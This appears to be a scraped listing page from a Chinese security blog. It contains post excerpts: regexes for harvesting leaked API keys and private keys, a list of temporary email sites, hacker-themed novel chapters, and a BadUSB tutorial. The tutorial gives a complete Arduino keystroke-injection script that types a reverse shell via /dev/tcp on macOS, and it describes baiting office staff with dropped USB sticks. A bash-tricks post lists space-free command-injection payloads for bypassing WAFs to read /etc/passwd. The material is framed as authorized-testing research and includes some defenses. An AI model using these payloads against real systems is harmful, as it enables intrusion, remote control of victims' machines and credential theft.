&amp;quot;slack_token&amp;quot;: &amp;quot;(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})&amp;quot;
&amp;lt;!-- more --&amp;gt;

&amp;quot;slack_webhook&amp;quot;: &amp;quot;https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}&amp;quot;
&amp;quot;facebook_oauth&amp;quot;: &amp;quot;[f|F][a|A][c|C][e|E][b|B][o|O][o|O][k|K].{0,30}[&#39;\&amp;quot;\\s][0-9a-f]{32}[&#39;\&amp;quot;\\s]&amp;quot;,
&amp;quot;twitter_oauth&amp;quot;: &amp;quot;[t|T][w|W][i|I][t|T][t|T][e|E][r|R].{0,30}[&#39;\&amp;quot;\\s][0-9a-zA-Z]{35,44}[&#39;\&amp;quot;\\s]&amp;quot;
&amp;quot;heroku_api&amp;quot;: &amp;quot;[h|H][e|E][r|R][o|O][k|K][u|U].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}&amp;quot;
&amp;quot;mailgun_api&amp;quot;: &amp;quot;key-[0-9a-zA-Z]{32}&amp;quot;
&amp;quot;mailchamp_api&amp;quot;: &amp;quot;[0-9a-f]{32}-us[0-9]{1,2}&amp;quot;
&amp;quot;picatic_api&amp;quot;: &amp;quot;sk_live_[0-9a-z]{32}&amp;quot;
&amp;quot;google_oauth_id&amp;quot;: &amp;quot;[0-9(+-[0-9A-Za-z_]{32}.apps.qooqleusercontent.com&amp;quot;
&amp;quot;google_api&amp;quot;: &amp;quot;AIza[0-9A-Za-z-_]{35}&amp;quot;
&amp;quot;google_captcha&amp;quot;: &amp;quot;6L[0-9A-Za-z-_]{38}&amp;quot;
&amp;quot;google_oauth&amp;quot;: &amp;quot;ya29\\.[0-9A-Za-z\\-_]+&amp;quot;
&amp;quot;amazon_aws_access_key_id&amp;quot;: &amp;quot;AKIA[0-9A-Z]{16}&amp;quot;
&amp;quot;amazon_mws_auth_token&amp;quot;: &amp;quot;amzn\\.mws\\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}&amp;quot;
&amp;quot;amazonaws_url&amp;quot;: &amp;quot;s3\\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\\.s3\\.amazonaws.com&amp;quot;
&amp;quot;facebook_access_token&amp;quot;: &amp;quot;EAACEdEose0cBA[0-9A-Za-z]+&amp;quot;
&amp;quot;mailgun_api_key&amp;quot;: &amp;quot;key-[0-9a-zA-Z]{32}&amp;quot;
&amp;quot;twilio_api_key&amp;quot;: &amp;quot;SK[0-9a-fA-F]{32}&amp;quot;
&amp;quot;twilio_account_sid&amp;quot;: &amp;quot;AC[a-zA-Z0-9_\\-]{32}&amp;quot;
&amp;quot;twilio_app_sid&amp;quot;: &amp;quot;AP[a-zA-Z0-9_\\-]{32}&amp;quot;
&amp;quot;paypal_braintree_access_token&amp;quot;: &amp;quot;access_token\\$production\\$[0-9a-z]{16}\\$[0-9a-f]{32}&amp;quot;
&amp;quot;square_oauth_secret&amp;quot;: &amp;quot;sq0csp-[ 0-9A-Za-z\\-_]{43}&amp;quot;
&amp;quot;square_access_token&amp;quot;: &amp;quot;sqOatp-[0-9A-Za-z\\-_]{22}&amp;quot;
&amp;quot;stripe_standard_api&amp;quot;: &amp;quot;sk_live_[0-9a-zA-Z]{24}&amp;quot;
&amp;quot;stripe_restricted_api&amp;quot;: &amp;quot;rk_live_[0-9a-zA-Z]{24}&amp;quot;
&amp;quot;github_access_token&amp;quot;: &amp;quot;[a-zA-Z0-9_-]*:[a-zA-Z0-9_\\-]+@github\\.com*&amp;quot;
&amp;quot;private_ssh_key&amp;quot;: &amp;quot;-----BEGIN PRIVATE KEY-----[a-zA-Z0-9\\S]{100,}-----END PRIVATE KEY——&amp;quot;
&amp;quot;private_rsa_key&amp;quot;: &amp;quot;-----BEGIN RSA PRIVATE KEY-----[a-zA-Z0-9\\S]{100,}-----END RSA PRIVATE KEY-----&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
">一些提取api key的正则表达式</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Temporary-mail-service/"" data-c="
          &lt;p&gt;临时邮箱，方便在一些网站隐藏自己身份信息，也可以在安全测试的使用。&lt;/p&gt;
&lt;h2 id=&#34;推荐使用的&#34;&gt;推荐使用的：&lt;/h2&gt;
&lt;p&gt;https://t.odmail.cn&lt;br&gt;
https://www.mohmal.com&lt;br&gt;
http://od.obagg.com&lt;br&gt;
http://onedrive.readmail.net&lt;br&gt;
http://xkx.me&lt;/p&gt;
&lt;h2 id=&#34;其它&#34;&gt;其它&lt;/h2&gt;
&lt;!-- more --&gt;
&lt;p&gt;https://www.guerrillamail.com/&lt;br&gt;
https://10minutemail.com&lt;br&gt;
https://www.trash-mail.com/inbox/&lt;br&gt;
https://www.mailinator.com&lt;br&gt;
http://www.yopmail.com/en&lt;br&gt;
https://generator.email&lt;br&gt;
https://en.getairmail.com&lt;br&gt;
http://www.throwawaymail.com/en&lt;br&gt;
https://maildrop.cc&lt;br&gt;
https://owlymail.com/en&lt;br&gt;
https://www.moakt.com&lt;br&gt;
https://tempail.com&lt;br&gt;
http://www.yopmail.com&lt;br&gt;
https://temp-mail.org/en&lt;br&gt;
https://www.emailondeck.com&lt;br&gt;
https://smailpro.com&lt;br&gt;
https://anonbox.net&lt;br&gt;
https://M.kuku.lu&lt;/p&gt;
">一些临时邮箱服务网站</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Badusb-Attack-On-Mac-OSX/"" data-c="
          &lt;p&gt;Badusb 已经出现了很多年，使用usb进行攻击的手段也从最初的利用autorun.inf、伪造文件夹名、快捷方式等手段转为更加难以防御的Badusb。这种攻击方式就是目前可绕过杀毒软件，防御较难。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/embed/VdbTwopR4iY&#34;&gt;点此打开&lt;/a&gt;观看一段演示视频，需fq。&lt;/p&gt;
&lt;h2 id=&#34;利用场景&#34;&gt;利用场景&lt;/h2&gt;
&lt;p&gt;说下本文中利用场景：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;混入企业内部，员工电脑未锁屏的情况下。在之前去过很多客户那里，大多数企业的员工离开电脑前不锁屏的情况,而且非常严重。&lt;/li&gt;
&lt;li&gt;对于无安全意识的员工进行攻击，如公司文员、前台、行政等，例如将usb贴上保密、照片等字样，并扔到显眼位置，以吸引人来捡并插入其电脑。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;针对Badusb攻击手段还有很多，利用场景也还有，这里仅列出与本文有关的部分。下面就让我们正式开始进入制作。&lt;/p&gt;
&lt;h2 id=&#34;准备工作&#34;&gt;准备工作&lt;/h2&gt;
&lt;h3 id=&#34;硬件&#34;&gt;硬件&lt;/h3&gt;
&lt;!-- more --&gt;
&lt;ul&gt;
&lt;li&gt;Arduino Leonardo 淘宝上直接搜索Badusb，有很多卖的，价格都比较便宜。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;软件&#34;&gt;软件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Arduino IDE  官网下载地址：&lt;a href=&#34;https://www.arduino.cc/en/Main/Software&#34;&gt;https://www.arduino.cc/en/Main/Software&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;免杀木马，我这里macos下直接用的反弹shell，windows下使用的是免杀的meterpreter，payload为reverse_tcp。由于免杀不是本文重点，请自行制作。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;基础知识&#34;&gt;基础知识&lt;/h2&gt;
&lt;p&gt;Badusb属于HID注入攻击的一种形式。HID是Human Interface Device的缩写，HID设备是直接与人交互的设备，例如键盘、鼠标与游戏杆等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。今天使用的Arduino Leonardo板子主要是一款键盘注入工具，除此之外还有WIFI版的（通过链接wifi，然后发起攻击）、伪装为充电线的（USB-C）。目前，前者成本较低，后者成本较高。有国外安全研究人员有在售卖USB Cable。有一些手机也支持用来进行hid注入攻击。比如GOOGLE NEXUS手机，刷入kali nethunter系统即可，在淘宝上可以购买到二手手机，成本只要300左右。&lt;/p&gt;
&lt;p&gt;安装好arduino ide后，插入Arduino Leonardo板子，打开arduino ide，选择【工具】-【开发版】-【Arduino Leonardo】。&lt;/p&gt;
&lt;p&gt;接下来就开始编写攻击代码了。默认显示的代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;void setup() {
  // put your setup code here, to run once:
}

void loop() {
  // put your main code here, to run repeatedly:
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;setup函数主要是安装时运行的代码，loop函数为重复执行的代码。一般我们都写入到setup函数中。&lt;br&gt;
代码的语法并不多，主要有：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;#include &amp;lt;Keyboard.h&amp;gt;&lt;/code&gt;  这里是包含Keyboard.h文件，该文件里定义了一些按键常量。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Keyboard.begin();&lt;/code&gt; 开始键盘通讯&lt;br&gt;
&lt;code&gt;delay(100);&lt;/code&gt; 延迟执行，单位是毫秒&lt;br&gt;
&lt;code&gt;Keyboard.press()&lt;/code&gt;   按下某个按键&lt;br&gt;
&lt;code&gt;Keyboard.release()&lt;/code&gt;  松开某个按键&lt;br&gt;
&lt;code&gt;Keyboard.end();&lt;/code&gt;  结束键盘通讯&lt;/p&gt;
&lt;p&gt;这里需要注意的是，不同的板子语法会有不同和差异。&lt;/p&gt;
&lt;p&gt;ascii对应键值表：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1586161712598.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;（图片来源：https://zhuanlan.zhihu.com/p/28194271）&lt;/p&gt;
&lt;h2 id=&#34;实战攻击&#34;&gt;实战攻击&lt;/h2&gt;
&lt;p&gt;好了，有了如上基础，我们可以来实战攻击了。网上的代码总有一些问题，导致实际的成功率并不高。所以我对其进行了加强。&lt;br&gt;
执行流程：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;打开 &lt;code&gt;聚焦搜索&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;搜索终端&lt;code&gt;terminal&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;打开终端&lt;/li&gt;
&lt;li&gt;执行&lt;code&gt;bash&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;执行反弹shell代码&lt;/li&gt;
&lt;li&gt;切换输入法&lt;/li&gt;
&lt;li&gt;再次执行反弹shell代码&lt;/li&gt;
&lt;li&gt;退出终端。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;采用如上的流程，主要考虑到如下了几种情况来，从而提高其代码执行的成功率。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;mac系统是类unix系统，区分大小写。&lt;/li&gt;
&lt;li&gt;不同的mac版本系统，以及使用者设置的习惯不同&lt;/li&gt;
&lt;li&gt;如何让反弹shell代码在后台执行，并隐藏终端窗口。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;具体的实现可看代码&lt;br&gt;
代码地址已经上传到github，地址：&lt;a href=&#34;https://github.com/insightglacier/badusb_script&#34;&gt;https://github.com/insightglacier/badusb_script&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;脚本代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include &amp;lt;Keyboard.h&amp;gt;

void setup() {
 Keyboard.begin();//开始键盘通讯
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(30);
  Keyboard.press(32);//按住空格，也就是command + 空格
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release(32);
  delay(100);
  Keyboard.println(&amp;quot;terminal&amp;quot;);  //打开终端
  delay(2000); 
  Keyboard.press(KEY_RETURN);
  delay(100); 
  Keyboard.release(KEY_RETURN);
  delay(500);
  Keyboard.println(&amp;quot;bash&amp;quot;); //打开bash
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(100);//
  Keyboard.println(&amp;quot;nohup bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.100/1337 0&amp;gt;&amp;amp;1 &amp;amp;&amp;quot;);// 利用nohup在后台执行反弹shell代码
  delay(100);
  Keyboard.press(KEY_RETURN);//
  delay(100);
  Keyboard.release(KEY_RETURN);
  delay(100);
  Keyboard.press(32);
  delay(100);
  Keyboard.release(KEY_CAPS_LOCK);   //切换输入法。
  delay(100);
  delay(100);
  Keyboard.press(KEY_LEFT_CTRL);   //另外一种切输入法操作
  delay(100);
  Keyboard.press(32);
  Keyboard.release(KEY_LEFT_CTRL);
  delay(100);
  Keyboard.release(32);
  delay(100);
  Keyboard.println(&amp;quot;nohup bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.100/1337 0&amp;gt;&amp;amp;1 &amp;amp;&amp;quot;);// 利用nohup在后台执行反弹shell代码
  delay(100);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.press(&#39;q&#39;);//按下Q键
  delay(100);
  Keyboard.release(&#39;q&#39;);// 放开Q键
  Keyboard.release(KEY_LEFT_GUI);//Command+Q退出终端
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
  Keyboard.end();//结束键盘通讯
}
void loop() {
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;代码注释写的很清楚来，也不难。写完代码后，我们可以点击验证（左上角对号）验证代码是否有语法错误。点击上传，ide会自动编译并上传代码到开发板中。成功后会直接执行我们的代码。测试在本机执行后，就可以到其机器上运行了。&lt;/p&gt;
&lt;h2 id=&#34;badusb防御&#34;&gt;Badusb防御&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Google 开源的badusb防御产品ukip，地址：https://github.com/google/ukip 。原理主要是监测按键键入的时间，并且自动判断是否为恶意攻击。&lt;/li&gt;
&lt;li&gt;在测试过程中，windows10 系统会识别一些恶意的usb固件。建议开启windows defender。当然这种也并不保险。&lt;/li&gt;
&lt;li&gt;对来历不明的usb设备，请慎重插入到电脑上（建议不插到电脑上）。&lt;/li&gt;
&lt;li&gt;当然网络上也有设置组策略的方式进行阻止，以及禁用usb口来防御。这里具体看企业自身情况进行设置。具体配置方法自行搜索吧。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;Badusb的优点是杀毒软件无法查杀和拦截，但是其缺点也很明显，就是键盘输入的过程会在界面上有短暂的显示。每种攻击手法并不是万能的，只是一种手段，根据攻击场景不同，选择合适的攻击手段最终达到完美的攻击，这是我们所需要追求的。&lt;/p&gt;
&lt;p&gt;关于Badusb的攻击这仅仅只是一种，还有更多的攻击方法，感兴趣的可以自行搜索学习。还有很多有趣的玩法。对于文中的问题，欢迎与我讨论交流。&lt;/p&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;https://zhuanlan.zhihu.com/p/28194271&lt;/li&gt;
&lt;li&gt;https://baike.baidu.com/item/USB-HID/3074554&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;注：本文仅做为研究，文中所提到的代码及攻击方式，仅用于企业内部安全测试与授权测试中。请勿将其用于非法渗透中，否则造成的一切后果与本人无关。&lt;/strong&gt;&lt;/p&gt;
">Badusb 攻击之MacOSX系统实战</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/build-own-cyberchef/"" data-c="
          &lt;p&gt;CyberChef是一个很好很强大的程序,很实用。&lt;/p&gt;
&lt;p&gt;由于官方发布的线上地址使用了google统计，为了安全，还是自己搭建或者本地使用。本地就仅限于自己的电脑才可使用。所以搭建自己线上的可以随时使用，方便许多。同时配合Open in CyberChef这个浏览器插件就更加方便。&lt;/p&gt;
&lt;p&gt;直接下载官方生成的包，下载地址：&lt;a href=&#34;https://github.com/gchq/CyberChef/releases&#34;&gt;https://github.com/gchq/CyberChef/releases&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我这里直接上传到github，并且启用github pages。然后绑定解析自己的域名即可线上访问。我这里搭建好的无google统计的地址：&lt;a href=&#34;https://cyberchef.bacde.me&#34;&gt;https://cyberchef.bacde.me&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;接下来安装Open in CyberChef 这个chrome插件。插件地址:&lt;a href=&#34;https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related&#34;&gt;https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这样就可以直接右键发送到自己的cyberchef，方便了很多。使用效果如下：&lt;/p&gt;
&lt;!-- more --&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585901306155.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585901514463.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585901579171.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">搭建自己的CyberChef</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/hunting-tips-mindmap/"" data-c="
          &lt;!-- more --&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585885276203.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;PDF下载地址：&lt;a href=&#34;https://drive.google.com/file/d/1p83ButiuItmvEyi_JAEVqEQ-AYYnLsb2/view?fbclid=IwAR3wQErPrAMcP_Md0m1IEO7qbquEE8jawwcpbp3ajpIuOoUievUGrDkbfWs&#34;&gt;https://drive.google.com/file/d/1p83ButiuItmvEyi_JAEVqEQ-AYYnLsb2/view?fbclid=IwAR3wQErPrAMcP_Md0m1IEO7qbquEE8jawwcpbp3ajpIuOoUievUGrDkbfWs&lt;/a&gt;&lt;/p&gt;
">Hunting Tips Mindmap</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Twelve/"" data-c="
          &lt;pre&gt;&lt;code&gt;人生比地狱还像地狱。
——芥川龙之介 《罗生门》
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;疫情之下，疾病面前，所有人都是平等的。无论你是谁，都有被感染的风险。等待病人的是死亡，因为病毒正在一点一点的无情摧毁着病人的防御系统。&lt;/p&gt;
&lt;p&gt;王梓很不幸，在到达小镇的几天内，他就开始感受到了全身的不舒服，症状与报道种的症状无例外。他很痛苦，但他的内心还仍然想着那未完成的事，那个真相。&lt;/p&gt;
&lt;p&gt;他已经没有什么力气，他无法在操作电脑，在现实世界，他没有了电脑，没有了电子产品，他变得普通到不能在普通。而多年的熬夜，不规律，是他的身体免疫特别查，尽管不久前开始练习太极拳，但是，这么短的时间他还没有增强太多。&lt;/p&gt;
&lt;p&gt;等待他的是死亡，死神正一点一点的靠近他。他想起了小楠，想起了他们在一起的日子。或许，如果人生让他重来的话，他不在选择生活在黑暗中。一切都已经晚了，人生没有重启键，无法重新来过。结局早已经在当初的选择时就已经注定。&lt;/p&gt;
&lt;p&gt;再见了，世界！&lt;/p&gt;
&lt;p&gt;就这样，王梓带着他所知道的秘密离开了这个世界。世界上其他的人仍然还在继续忙碌着，在寻找他。&lt;/p&gt;
&lt;p&gt;（完）&lt;/p&gt;
&lt;p&gt;草草的完结了不算小说的小说，最近反复读了多遍，自己感觉已经无法写下去了。计划对小说重新进行构思。或许还会有下一步真正意义上的小说。谢谢大家！&lt;/p&gt;
">原创小说《杀手》第十二章 疫情之下（完）</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Eleven/"" data-c="
          &lt;pre&gt;&lt;code&gt;真正的牢狱是恐惧
而真正的自由是
免于恐惧的自由
            ——昂山素季
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;北京下雪了&#34;&gt;北京，下雪了&lt;/h2&gt;
&lt;p&gt;近几年北京下雪的场景比较罕见，不过今年似乎是个以外，这已经是北京的第三场雪了。而中国最传统的节日——春节也即将到来。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585023705115.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;王梓坐在不知通往哪里的车，看着窗外的大雪，回忆起了10年前的冬天：同样是下雪天，而他穿着单薄的衣服，刚刚从网吧里出来。而此时的他已经没有钱了。因为经常来这家网吧，他跟网吧的老板比较熟，他曾经跟老板商量，能不能赊账。当时网吧老板直接就给拒绝了，并摆出了一副没有商量的姿态。网吧老板知道王梓的父亲跟母亲离婚，而父亲整日无所事事，只会到处去骗点钱，然后买酒，赌博。10年前的王梓还在上初中，整天不好好学习，沉迷于网络游戏中，但是因为穷，父亲给的钱不多，也没多少时间上网。每次从网吧出来都要走着回家。&lt;/p&gt;
&lt;!-- more --&gt;
&lt;p&gt;一阵阵的风吹过，王梓又收了收紧自己的衣服。他心想着：“我得找个地方暖暖”。他加快了脚步，同时在看附近有没有可以不要钱又能暖和的地方，而他也很幸运的发现了一家小书店，书店名叫三联书店。他什么都没想就朝着书店走去。推开了门，“叮铃～”，一个清脆的声音从王梓头上发出。屋子里很暖合，面积不大，一共只有四排书架，还有一些书被平放在长长的桌子上，右侧的收银妹子正在忙着，其他还有几个在选书的男男女女，买书的人也不多。而此时王梓已经从寒冷中缓了过来。他开始漫无目的乱看。这家书店卖的大多数都是杂志，很全，什么种类的都有，除了常见的《意林》、《故事会》外，还有科技类，车类，军事类、时尚类。而映入王梓眼帘的有几个大字，上面写着“黑客x档案”，而在杂志的封面，王梓注意到了一个标题“教你如何在网吧免费上网”。王梓的兴趣来了，拿起了书读起来。因为没钱买，他特意看了两遍，把杂志中的步骤记下来了。外面的雪还没有停，王梓便翻了翻其他的文章，看了一会，发现其他的完全看不懂。不过他了解到了网络中有一种身份是黑客，而这本杂志讲述了黑客技术，可以教会别人怎么去入侵别人的网站，怎么获得免费的东西，怎么去盗取别人的账号密码等。他又看了看，还是看不懂，他想，算了，先试试免费上网。&lt;/p&gt;
&lt;p&gt;第二天，他拿着几块钱，来到一家新的网吧，打算尝试新学会的技能，他只押1个小时的钱。开始按照书中的内容操作，因为要等待到时间了才能知道成功不成功。王梓也不想打游戏了，完全被前一天看到的内容所吸引。他想搞明白昨天看的那些到底是什么，他开始在网络中寻找这些相关的资料。时间过的很快，1个小时过去了。他的机器没有被锁住，还可以继续上网。此时的他内心中有一点点害怕，但同时也是兴奋的。他成功了逃过了网吧的计费软件，免费上网了。那个免费上网方法原来很简单，因为网吧计费软件使用了ipx的协议进行通信，而王梓那时候逃过计费软件仅仅只是通过禁用该协议来让网吧的计费控制端不能给他的机器发送锁屏，关机等指令。当时对刚入门的王梓来说，那可是相当的神奇。当然这种方法在现在已经不管用了。后来他去以前经常去的那家网吧，学会了破解了网吧客户端的密码，以管理员身份上网。而在不久后，他又学会了用啊d网络工具包入侵网吧计费电脑来给自己改钱。不过因为初出茅庐，次数多了就被网管发现，被警告，被赶出过网吧。不过，他享受着。或许也是因为这刚开始小小的成功，他对黑客的兴趣也更加浓烈，也是因为此，如今的他成了一名职业黑客。&lt;/p&gt;
&lt;p&gt;车停下了，王梓背起包走下车。这是一个小镇，因为临近春节，大街小巷的路灯都挂满了红彤彤的灯笼，小镇显得格外的热闹。春节是一个家人团聚的节日，而对于王梓来说，他就是家，他在哪里家就在哪里。小镇四处转转，其实他是在熟悉地形。找了视野比较好的地方，在附近租了一间房子，这便是安顿下来了。打开了电脑。点开了留言：“你失信了！东西在哪里？交出来！不然你会很危险！”&lt;/p&gt;
&lt;p&gt;王梓最讨厌的就是背叛和威胁，这个单子，让他陷入如此的境遇。王梓所向往的自由还很远。他不去理会，而是看看最近网络新闻，最近大多数消息都开始围绕一种新型冠状病毒，随着报道越来越多，以及病例数也逐渐增多。一时间全国各地的药店，口罩和消毒水卖到脱销。王梓也赶紧买了一些。接下来的日子王梓要想办法过上正常生活，他再次打开电脑，并给对方回复：“你违背了我的交易原则，不与政府有任何关系。作为惩罚，你们的钱我扣下了”。发完消息后，他收起电脑。该好好休息下了。&lt;/p&gt;
&lt;p&gt;王梓做了一个梦：“一个阳光明媚的午后，王梓在街上走着，小楠出现在了不远处向他走来，阳光从侧上方照射到了小楠身上，小楠的身后就像发着光，一阵风吹过她的秀发，飘起，微微一笑。王梓也不自觉的笑起来。小楠美极了。突然，一阵刹车声，一辆车停下，几个人下车，迅速的跑向小楠，把小楠抓到了车上。而此时的王梓想要去追上去，却追不上去，车子离的越来越远。很快的，王梓听到小楠的哭泣声，救我～救我～，小楠被绑在一个椅子上，眼睛被封住。旁边有人拿了一把刀架在她的脖子上。有一个中年人在视频中对王梓说，看到她了吧，在我们这里，你赶快现身，不然我们做出什么事情。说着刀子又下去了一点，小楠的脖子开始从刀子上流出一点点鲜血。王梓大声喊：不要，不要，你们在哪里，我去，快她放了。”&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1585023384199.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;“不要……”王梓从梦中惊醒。满头大汗，此时房间内四周都很安静，什么都没有发生。他去客厅倒了一杯数，深吸了一口气，让自己平静下来。&lt;/p&gt;
&lt;p&gt;（未完待续）&lt;/p&gt;
&lt;h2 id=&#34;黑客兵器谱&#34;&gt;黑客兵器谱&lt;/h2&gt;
&lt;p&gt;啊d网络工具包：一款网络工具包，有很多入侵功能，文中提到的是利用木马种植器功能，配合pcshare控制了网吧的电脑（亲身经历过的）。当然还有其他的功能如端口探测等，目标发现，共享扫描等功能。在以前idc没有过滤139，135这类端口对外网也是有效果的。&lt;/p&gt;
&lt;h2 id=&#34;小知识&#34;&gt;小知识&lt;/h2&gt;
&lt;p&gt;文中所说的免费上网原理其实已经交代明白了，因为都已经失效了，所以不再重复了。而获取网吧客户端的密码直接使用读取的软件就可以读出来了。&lt;/p&gt;
">原创小说《杀手》第十一章 自由</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/bashtricks-execute-commands-without-space/"" data-c="
          &lt;p&gt;在一些漏洞利用场景，或者因为waf等原因，导致无法使用空格时，可以试试如下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;IFS=,;`cat&amp;lt;&amp;lt;&amp;lt;cat,/etc/passwd` 
cat$IFS/etc/passwd 
cat${IFS}/etc/passwd 
cat&amp;lt;/etc/passwd 
{cat,/etc/passwd} 
X=$&#39;cat\x20/etc/passwd&#39;&amp;amp;&amp;amp;$X
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;经过测试，除最后一条在mac osx下执行失败，这些命令在ubuntu 19.10和centos7下均执行成功。在mac osx系统下系统会将cat\x20/etc/passwd当成一个可执行文件，会提示No such file or directory。&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&#34;https://twitter.com/omespino/status/1241544334329208838&#34;&gt;https://twitter.com/omespino/status/1241544334329208838&lt;/a&gt;&lt;/p&gt;
&lt;!-- more --&gt;
">bashtricks ：无空格命令执行</a>
      </div>
      
      <div class="item">
        <a class="result-title" href="https://bacde.me/post/Killer-Chapter-Ten/"" data-c="
          &lt;p&gt;&lt;strong&gt;我不相信造化弄人。世界上出类拔萃的人，都主动找寻他们想要的环境。要是遍寻不获,他们就创造一个。 ——萧伯纳&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;王梓家中&#34;&gt;王梓家中&lt;/h2&gt;
&lt;p&gt;结果往往在一个人做选择的时候就已经注定。危险正在一点一点向王梓靠近。买家提出的线下交易，对于网络杀手走入现实，那么就以为着自杀。羸弱的王梓，能打得过谁呢。除此之外，还很有可能就像阿桑奇被捕时的样子。那一副银白色手镯想想都觉得冰冷。王梓不禁打了一个冷颤。&lt;/p&gt;
&lt;p&gt;当下，王梓没有太多的时间想这些，他必须要走下去。就算没有出路，那么也要走出一条自己的路。&lt;/p&gt;
&lt;p&gt;普通的夜晚，大多数人已进入梦乡。王梓在电脑前敲击着键盘，眼镜上可以看到映射出的一行行代码，电脑的usb口上连接着一台树莓派上。此时编写的程序就是即将在这台微型电脑上运行的。流动的代码仿佛在与时间赛跑，慢一步就可能被超过而崩溃。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://bacde.me/post-images/1584374892509.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
